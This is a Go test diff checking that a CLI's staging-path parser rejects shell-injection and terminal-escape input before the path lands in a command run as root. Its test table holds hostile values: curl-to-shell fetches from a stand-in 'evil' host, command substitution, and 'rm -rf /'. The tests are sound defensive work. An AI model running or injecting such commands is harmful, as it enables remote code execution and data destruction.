@@ -223,3 +223,59 @@ func TestParseUnitShow_BindAddressOverrides(t *testing.T) {
 		}
 	}
 }
+
+// The staging path is interpolated into a command the CLI prints for the
+// operator to run as root, and it arrives over a channel with no transport
+// authentication — so anything that could turn one argument into two
+// commands must yield "" and drop the flag from the remedy.
+func TestDataDirFromMessage_RejectsInjection(t *testing.T) {
+	const marker = "reason=units-missing: /etc/systemd/system/runed-upgrade.path watches /x, but this server stages to "
+	// The invariant is not "returns empty" — truncating at the newline and
+	// keeping a clean prefix is a fine outcome. It is that nothing which
+	// could start a second command ever reaches the printed line.
+	for _, bad := range []string{
+		"/var/lib/rune/upgrade/ready\ncurl$IFS-sL$IFShttps://evil/x|sh\n#",
+		"/var/lib/rune/upgrade/ready;curl evil|sh",
+		"/var/lib/rune/upgrade/ready`id`",
+		"/var/lib/rune/upgrade/ready$(id)",
+		"/var/lib/rune/upgrade/ready|sh",
+		"/var/lib/rune/upgrade/ready\x1b[2Kfake",
+		// A control byte carrying no shell metacharacter still rewrites
+		// the terminal, so the metacharacter guard alone is not enough.
+		"/var/lib/rune/upgrade\x01/ready",
+		"/var/lib/rune/upgrade\x7f/ready",
+		"/var/lib/rune/upgrade/ready && rm -rf /",
+	} {
+		got := DataDirFromMessage(marker + bad)
+		if got == "" {
+			continue // refused outright, also fine
+		}
+		if !strings.HasPrefix(got, "/") || strings.ContainsAny(got, " \t\r\n\"'`$;&|<>()!#~*?") {
+			t.Fatalf("unsafe value reached the remedy line: input %q -> %q", bad, got)
+		}
+		for _, r := range got {
+			if r < 0x20 || r == 0x7f {
+				t.Fatalf("control byte reached the remedy line: input %q -> %q", bad, got)
+			}
+		}
+	}
+	// A relative path is never a valid staging dir.
+	if got := DataDirFromMessage(marker + "relative/path/ready"); got != "" {
+		t.Fatalf("relative path must be refused, got %q", got)
+	}
+	// A plain absolute path is still extracted, minus the trigger file.
+	// Both trailing components come off: the installers take --data-dir and
+	// append "upgrade" themselves.
+	if got := DataDirFromMessage(marker + "/mnt/data/upgrade/ready — reinstall the units"); got != "/mnt/data" {
+		t.Fatalf("clean path: %q", got)
+	}
+	if got := DataDirFromMessage("no marker here"); got != "" {
+		t.Fatalf("absent marker: %q", got)
+	}
+}
+
+func TestSanitizeServerDetail(t *testing.T) {
+	if got := SanitizeServerDetail("ok\x1b[2K\nmore\x07"); got != "ok[2Kmore" {
+		t.Fatalf("control bytes must be stripped, got %q", got)
+	}
+}
